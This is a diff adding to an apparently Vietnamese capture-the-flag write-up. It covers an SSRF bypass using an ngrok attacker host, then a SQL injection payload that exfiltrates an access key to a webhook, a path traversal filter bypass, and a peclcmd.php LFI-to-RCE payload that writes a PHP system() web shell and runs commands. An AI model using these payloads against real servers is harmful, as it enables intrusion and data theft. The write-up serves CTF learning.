@@ -120,3 +120,28 @@ trong đó '#' để bypass file extension (khi hàm check thì thấy có .jpg 
 khi sử dụng payload , nodejs với URLParse sẽ nhận diện url là i.ibb.co => qua đc hàm bypass trong khi bot nhận diện là 96f8-100-53-180-110.ngrok.io
 
 bot sẽ truy cập vào trong attacker host (..-110.ngrok.io)và attacker host sẽ redirect đến "file:///usr/src/app/fl4gg_tetCTF#lol.jpg" (cái mà chúng ta k thể khiến bot truy cập do bị filter http/https với tên host) ==> lấy đc flag 
+_______________________________________________________________________________________________GIFT________________________________________________________________
+
+chall : explot sql injection + LFI lead to RCE with peclcmd.php
+
+cho 1 trang web login , yêu cầu phải có username , passwd và access_key(có trong file sql của chall nhưng chỉ biết dạng chứ không biết được nội dung)   
+chúng ta khi mở code source của nó thì thấy 1 đường dẫn ẩn đến /send_pic.php , khi đó ta có 1 trang với 2 ô nhập : URL và ID
+trong đó ID là mục cần truy vấn dữ liệu (có trong file sql của chall) và URL là nơi server sẽ gửi lại kết quả của truy vấn mục vừa nãy đến URL mà mình nhập vào => nhận diện luôn sql injection ở mục ID
++ phần sql injection 
+với dữ liệu có sẵn (có trong file sql của chall) thì ta có thể lấy được access_key qua payload
+url=https://(webhook url)&id=5' union select KEY_CC from access_key limit 1 (nhớ viết hoa KEY_CC vì để bypass filter chữ key_cc)
+=> lấy được access_key
+
++ phần rce with peclcmd.php
+khi truy cập vào được trang chủ , ta có thấy 1 path /get_img.php?file=tan.jgp , khi ta thử với ../../../etc/passwd thì lại xem được file đó
+mà web lại sử dụng php => dùng LFI lead to RCE with peclcmd.php để lấy rce 
+note: ở đây có bị filter ../../../ khi dùng nên phải thay == .././.././ 
+payload tạo backdoor : 
+
+/get_img.php/?+config-create+/&file=.././.././.././.././../usr/local/lib/./php/peclcmd.php&/<?=system($_GET[%27cmd%27]);?>+/tmp/sign3.php
+với /tmp/sign3.php là nơi chứa backdoor , .././.././.././.././../usr/local/lib/./php/peclcmd.php là nơi chứa peclcmd để tạo shell , <?=system($_GET[%27cmd%27]);?> là câu lệnh để tạo shell
+
+/get_img.php?cmd=ls%20/&file=..//..//..//..//..//..//..//..//tmp/sigh3.php và /get_img.php?cmd=cat%20/flag_ne_hihi.txt&file=..//..//..//..//..//..//..//..//tmp/sigh3.php 
+với cmd=... là nơi nhập command để thực thi (trong ví dụ trên là câu lệnh ls /)
+
+
